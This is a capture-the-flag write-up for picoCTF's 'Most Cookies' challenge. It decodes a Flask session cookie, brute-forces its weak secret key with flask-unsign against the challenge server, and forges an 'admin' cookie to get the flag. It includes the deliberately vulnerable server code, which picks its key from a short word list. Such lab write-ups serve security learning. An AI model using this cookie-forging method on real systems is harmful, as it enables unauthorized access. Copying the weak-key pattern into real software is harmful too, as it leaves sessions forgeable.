




Examine the browser and decode the cookies

Decode flask cookie
https://jwt.io/




Defeating flask cookies
https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce

```
Pip install flask-unsign
```

How to use it, decoding a cookie
```
 flask-unsign --decode --cookie 'eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.ZRnCYg.vy6el8XLetqwYT9_5Iip6uw7oaE'
 ```
the result
```
{'very_auth': 'snickerdoodle'}
```



How to find the "secret key" of the encription with flask unsing locally (look assets to know more about wordlist and cookie.txt)
```
┌──(cds㉿kali)-[~/Downloads]
└─$ flask-unsign --unsign --cookie < cookie.txt --wordlist wordlist.txt 
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'peanut butter'
```


How to find the secret key directly to the server with flask unsign
```
┌──(cds㉿kali)-[~/Downloads]
└─$ flask-unsign --unsign --server http://mercury.picoctf.net:35697/ --wordlist wordlist.txt
[*] Server returned HTTP 302 (FOUND)
[+] Successfully obtained session cookie: eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.ZRnIXQ.6GRcGbPNV1NSTkzpjqnZGT6WPFI
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'peanut butter'
```




Forge your own cookie (TOOL)
https://github.com/noraj/flask-session-cookie-manager

```
┌──(venv)─(cds㉿kali)-[~/flask-session-cookie-manager]
└─$ flask_session_cookie_manager3.py encode -s "peanut butter" -t "{'very_auth':'admin'}"
/home/cds/flask-session-cookie-manager/venv/bin/flask_session_cookie_manager3.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('flask-session-cookie-manager==1.2.1.1', 'flask_session_cookie_manager3.py')
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZRnOZA.Uo4KQehfWD7PVhMiZ4hfp1tefJg

```


picoCTF{pwn_4ll_th3_cook1E5_22fe0842}





## ASSETS ##

The cookie.txt
```
Cookie:
eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.ZRnCYg.vy6el8XLetqwYT9_5Iip6uw7oaE

```

The equivalent was snickerdoodle

{'very_auth': 'snickerdoodle'}


wordlist.txt (the list of cookies from the server.py file)

```
┌──(cds㉿kali)-[~/Downloads]
└─$ cat wordlist.txt 
snickerdoodle
chocolate chip
oatmeal raisin
gingersnap
shortbread
peanut butter
whoopie pie
sugar
molasses
kiss
biscotti
butter
spritz
snowball
drop
thumbprint
pinwheel
wafer
macaroon
fortune
crinkle
icebox
gingerbread
tassie
lebkuchen
macaron
black and white
white chocolate macadamia

```



server.py
```
1   │ from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
   2   │ import random
   3   │ app = Flask(__name__)
   4   │ flag_value = open("./flag").read().rstrip()
   5   │ title = "Most Cookies"
   6   │ cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "
       │ molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle",
       │  "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
   7   │ app.secret_key = random.choice(cookie_names)
   8   │ 
   9   │ @app.route("/")
  10   │ def main():
  11   │     if session.get("very_auth"):
  12   │         check = session["very_auth"]
  13   │         if check == "blank":
  14   │             return render_template("index.html", title=title)
  15   │         else:
  16   │             return make_response(redirect("/display"))
  17   │     else:
  18   │         resp = make_response(redirect("/"))
  19   │         session["very_auth"] = "blank"
  20   │         return resp
  21   │ 
  22   │ @app.route("/search", methods=["GET", "POST"])
  23   │ def search():
  24   │     if "name" in request.form and request.form["name"] in cookie_names:
  25   │         resp = make_response(redirect("/display"))
  26   │         session["very_auth"] = request.form["name"]
  27   │         return resp
  28   │     else:
  29   │         message = "That doesn't appear to be a valid cookie."
  30   │         category = "danger"
  31   │         flash(message, category)
  32   │         resp = make_response(redirect("/"))
  33   │         session["very_auth"] = "blank"
  34   │         return resp
  35   │ 
  36   │ @app.route("/reset")
  37   │ def reset():
  38   │     resp = make_response(redirect("/"))
  39   │     session.pop("very_auth", None)
  40   │     return resp
  41   │ 
  42   │ @app.route("/display", methods=["GET"])
  43   │ def flag():
  44   │     if session.get("very_auth"):
  45   │         check = session["very_auth"]
  46   │         if check == "admin":
  47   │             resp = make_response(render_template("flag.html", value=flag_value, title=title))
  48   │             return resp
  49   │         flash("That is a cookie! Not very special though...", "success")
  50   │         return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
  51   │     else:
  52   │         resp = make_response(redirect("/"))
  53   │         session["very_auth"] = "blank"
  54   │         return resp
  55   │ 
  56   │ if __name__ == "__main__":
  57   │     app.run()
  58   │ 

```